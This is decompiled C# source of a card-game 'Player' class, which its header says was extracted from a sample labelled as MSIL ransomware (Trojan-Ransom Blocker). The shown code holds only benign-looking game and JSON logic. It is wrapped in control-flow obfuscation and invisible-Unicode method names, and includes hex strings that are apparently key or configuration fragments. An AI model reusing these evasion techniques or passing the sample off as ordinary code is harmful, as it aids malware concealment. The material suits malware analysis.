// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: DigitShap, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: AB9237C5-7B14-44B1-B37B-A2ADF34FB693
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-ed844cfae2c80b291651f15b71e1c0608612446513cb527a5753bfa831a2e348.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 1055800324;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2122487093)) % 12U)
        {
          case 0:
            num1 = (int) num2 * -941262017 ^ -456878920;
            continue;
          case 1:
            str1 = "75624573575678556F";
            num1 = (int) num2 * 211405027 ^ 73752416;
            continue;
          case 2:
            int num3 = BaseStream == 0 ? -1823804741 : (num3 = -651896182);
            num1 = num3 ^ (int) num2 * 2056592501;
            continue;
          case 3:
            int num4 = flag ? -650240286 : (num4 = -723307104);
            num1 = num4 ^ (int) num2 * 1091340161;
            continue;
          case 4:
            str1 = "4461746554696D654B69";
            num1 = (int) num2 * 446812161 ^ 1360644325;
            continue;
          case 5:
            flag = BaseStream == 1;
            num1 = 1394755510;
            continue;
          case 6:
            str2 = str1;
            num1 = 137508482;
            continue;
          case 7:
            num1 = (int) num2 * -1010846529 ^ 2073888442;
            continue;
          case 8:
            num1 = (int) num2 * 1834774029 ^ -279745097;
            continue;
          case 9:
            str1 = (string) null;
            num1 = (int) num2 * -257710081 ^ -1978143256;
            continue;
          case 11:
            goto label_1;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 1781669416;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 270779721)) % 4U)
        {
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1675866150 ^ 2069640915;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = 23449862;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = -1555182169;
        int index;
        int planningCardsCount;
        int[] planningCards;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num2 ^ -2132705109)) % 13U)
          {
            case 0:
              num2 = (int) num3 * 1030279063 ^ 1391166963;
              continue;
            case 1:
              index = 0;
              num2 = (int) num3 * 1903121572 ^ -2144564574;
              continue;
            case 2:
              num2 = (int) num3 * -1266940136 ^ -1293466146;
              continue;
            case 3:
              ++index;
              num2 = (int) num3 * -1332259077 ^ 1094451470;
              continue;
            case 4:
              int num4;
              num2 = num4 = planningCards[index] <= 0 ? -583189638 : (num4 = -1490244647);
              continue;
            case 5:
              goto label_1;
            case 6:
              num2 = -783157709;
              continue;
            case 7:
              int num5;
              num2 = num5 = index >= planningCards.Length ? -1597683924 : (num5 = -511793143);
              continue;
            case 8:
              num2 = (int) num3 * -881085509 ^ -670422600;
              continue;
            case 9:
              planningCards = this.PlanningCards;
              num2 = (int) num3 * -580294980 ^ 960224303;
              continue;
            case 11:
              ++num1;
              num2 = (int) num3 * 1061705558 ^ -2080543434;
              continue;
            case 12:
              planningCardsCount = num1;
              num2 = (int) num3 * -36809780 ^ 599283839;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 1085866619;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1736969670)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 1113107903 ^ -1357270826;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 928675835 ^ 2023072091;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -295365683;
      bool flag1;
      int index;
      int planningCard;
      string str1;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1665989739)) % 16U)
        {
          case 0:
            flag1 = index < this.PlanningCards.Length;
            num1 = -68772047;
            continue;
          case 1:
            num1 = (int) num2 * -1183152286 ^ -1725881;
            continue;
          case 2:
            num1 = (int) num2 * -1705483241 ^ -33663427;
            continue;
          case 3:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * 794813614 ^ -1639489936;
            continue;
          case 4:
            int num3 = !flag1 ? -61015423 : (num3 = -1265233050);
            num1 = num3 ^ (int) num2 * -620025534;
            continue;
          case 5:
            num1 = (int) num2 * -1248664468 ^ 1193532144;
            continue;
          case 7:
            goto label_1;
          case 8:
            str1 = " ";
            num1 = (int) num2 * 1365153564 ^ 688329503;
            continue;
          case 9:
            ++index;
            num1 = -1989184955;
            continue;
          case 10:
            index = 0;
            num1 = (int) num2 * 1503728555 ^ 1218811850;
            continue;
          case 11:
            num1 = -1096667994;
            continue;
          case 12:
            str2 = str1;
            num1 = (int) num2 * -410691156 ^ -1166643865;
            continue;
          case 13:
            int num4 = !flag2 ? -77401329 : (num4 = -2020130620);
            num1 = num4 ^ (int) num2 * 1996266068;
            continue;
          case 14:
            str1 = Player.\u206F‪‎‮⁯‍⁯‍‬⁪⁯‌⁬⁬‌‌⁬‍‌‍⁭⁭‭‮​‬‪⁪‪‪⁪‫‮‪‬‮‮⁬‬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1797960404;
            continue;
          case 15:
            flag2 = planningCard == 0;
            num1 = (int) num2 * -1929168963 ^ 89553339;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1656944698;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1038754140)) % 4U)
        {
          case 1:
            num1 = (int) num2 * 744968369 ^ -763631283;
            continue;
          case 2:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -1846519458 ^ -1992308659;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 422731543;
      int aIndex;
      int[] numArray;
      int[] planningCards;
      int count;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 488024884)) % 10U)
        {
          case 0:
            aIndex = 0;
            num1 = (int) num2 * -1645354687 ^ 1248118762;
            continue;
          case 1:
            num1 = (int) num2 * 2060927457 ^ 226029078;
            continue;
          case 2:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 1571658252;
            continue;
          case 3:
            goto label_1;
          case 4:
            planningCards = numArray;
            num1 = (int) num2 * 1920071570 ^ 44507269;
            continue;
          case 5:
            numArray = new int[count];
            num1 = (int) num2 * 51090419 ^ 2065406123;
            continue;
          case 6:
            int num3;
            num1 = num3 = aIndex >= count ? 1235611094 : (num3 = 962877892);
            continue;
          case 8:
            num1 = (int) num2 * -1360998679 ^ -632070008;
            continue;
          case 9:
            count = json.Count;
            num1 = (int) num2 * 722268374 ^ 213632753;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -947536392;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -999255393)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 1477150714 ^ 547272770;
            continue;
          case 2:
            goto label_1;
          case 3:
            str = Player.\u200F⁭⁮​⁪⁯‏‌‭‮‍‎⁪‬‌‭⁮‏‫⁮⁭⁫‌‮⁯‏⁮‌⁬⁭‮‏⁯⁮⁮⁭‪‬​⁪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -1451963716 ^ 161474583;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u206F‪‎‮⁯‍⁯‍‬⁪⁯‌⁬⁬‌‌⁬‍‌‍⁭⁭‭‮​‬‪⁪‪‪⁪‫‮‪‬‮‮⁬‬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200F⁭⁮​⁪⁯‏‌‭‮‍‎⁪‬‌‭⁮‏‫⁮⁭⁫‌‮⁯‏⁮‌⁬⁭‮‏⁯⁮⁮⁭‪‬​⁪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
